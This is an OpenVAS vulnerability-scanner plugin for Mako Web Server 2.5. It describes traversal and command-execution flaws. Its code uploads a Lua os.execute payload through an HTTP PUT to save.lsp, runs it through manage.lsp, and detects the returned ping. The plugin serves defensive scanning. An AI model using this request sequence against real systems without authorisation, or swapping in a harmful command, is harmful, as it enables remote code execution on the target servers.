###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mako_web_server_mult_vuln.nasl 12043 2018-10-23 14:16:52Z mmartin $
#
# Mako Web Server Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mako:mako_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811771");
  script_version("$Revision: 12043 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-23 16:16:52 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
  script_name("Mako Web Server Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Mako/WebServer/installed");
  script_require_ports("Services/www", 9357, 80, 443);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/42683");
  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3391");

  script_tag(name:"summary", value:"The host is running Mako Web Server and
  is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether we are able to execute arbitrary code on affected target or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - Mako web-server tutorial does not sufficiently sanitize the HTTP PUT
    requests when a user sends an HTTP PUT request to 'save.lsp' web page,
    the input passed to a function responsible for accessing the filesystem.

  - Mako web-server tutorial is not sufficiently sanitizing GET requests when
    a user sends GET request to the URI 'IP/fs/../..', the input is passed
    without modification and the response with the file content is returned.

  - Mako web-server tutorial is not sufficiently sanitizing incoming POST
    requests when a user sends an POST request to the
    'rtl/appmgr/new-application.lsp' URI, the input will be executed and the
    server will connect to the attacker's machine.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary commands, gain access to potentially sensitive
  and conduct cross site request forgery attacks.");

  script_tag(name:"affected", value:"Mako Web Server version 2.5. Other versions
  may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!makoPort = get_app_port(cpe:CPE)){
  exit(0);
}

host = http_host_name(port:makoPort);

if(host_runs("Windows") == "yes"){
  CMD = "os.execute('ping -n 5 " + this_host() + "')";
  win = TRUE;
}else{
  check = "__OpenVAS__" + rand_str(length:4);
  pattern = hexstr(check);
  CMD = "os.execute('ping -c 5 -p " + pattern + " " + this_host() + "')" ;
}

len = strlen(CMD);
if(!len){
  exit(0);
}

url = "/examples/save.lsp?ex=openVASTest";
req = string("PUT ", url, " HTTP/1.1\r\n",
          "Content-Length: ", len, "\r\n",
          "Host: ", host, "\r\n",
          "\r\n", CMD);
res = http_keepalive_send_recv(port:makoPort, data:req);
if(res =~ "204 No Content" && "Server: MakoServer.net" >< res){

  soc = open_sock_tcp(makoPort);
  if(!soc){
    exit(0);
  }

  url = "/examples/manage.lsp?execute=true&ex=openVASTest&type=lua";

  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n");

  res = send_capture( socket:soc,
                      data:req,
                      timeout:2,
                      pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
  close(soc);
  if(res && (win || check >< res)){
    report = "It was possible to execute command remotely at " + report_vuln_url( port:makoPort, url:url, url_only:TRUE ) + " with the command '" + CMD + "'.";
    security_message( port:makoPort, data:report);
    exit(0);
  }
}

exit(99);
